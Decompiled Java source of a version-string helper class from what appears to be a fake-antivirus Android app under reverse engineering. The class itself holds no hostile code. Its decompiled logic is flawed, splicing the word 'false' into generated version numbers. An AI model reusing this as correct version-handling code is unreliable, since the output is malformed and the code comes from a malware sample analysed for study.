package com.worker.androiddefender2;

public class VersionWorker {
  static final int razrad_version = 999;
  
  public int first_v = 10;
  
  public int four_v = 1;
  
  public int second_v = 0;
  
  public int third_v = 0;
  
  public String generateVersion(int paramInt1, int paramInt2, int paramInt3, int paramInt4) {
    int i = paramInt4;
    if (paramInt4 < 999)
      i = paramInt4 + 1; 
    if (i >= 999 && paramInt3 < 999) {
      int n = paramInt3 + 1;
      boolean bool = false;
      paramInt4 = paramInt2;
      int i1 = paramInt1;
      return i1 + "." + paramInt4 + "." + n + "." + bool;
    } 
    if (paramInt2 < 999 && paramInt3 >= 999) {
      paramInt4 = paramInt2 + 1;
      boolean bool = false;
      int i1 = paramInt1;
      int n = i;
      return i1 + "." + paramInt4 + "." + bool + "." + n;
    } 
    int m = paramInt1;
    paramInt4 = paramInt2;
    int j = paramInt3;
    int k = i;
    if (paramInt1 < 999) {
      m = paramInt1;
      paramInt4 = paramInt2;
      j = paramInt3;
      k = i;
      if (paramInt2 >= 999) {
        m = paramInt1 + 1;
        paramInt4 = 0;
        j = paramInt3;
        k = i;
      } 
    } 
    return m + "." + paramInt4 + "." + j + "." + k;
  }
  
  public String generateVersionFromString(String paramString) {
    String[] arrayOfString = paramString.split("\\D");
    this.first_v = Integer.parseInt(arrayOfString[0]);
    this.second_v = Integer.parseInt(arrayOfString[1]);
    this.third_v = Integer.parseInt(arrayOfString[2]);
    this.four_v = Integer.parseInt(arrayOfString[3]);
    return generateVersion(this.first_v, this.second_v, this.third_v, this.four_v);
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/VersionWorker.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */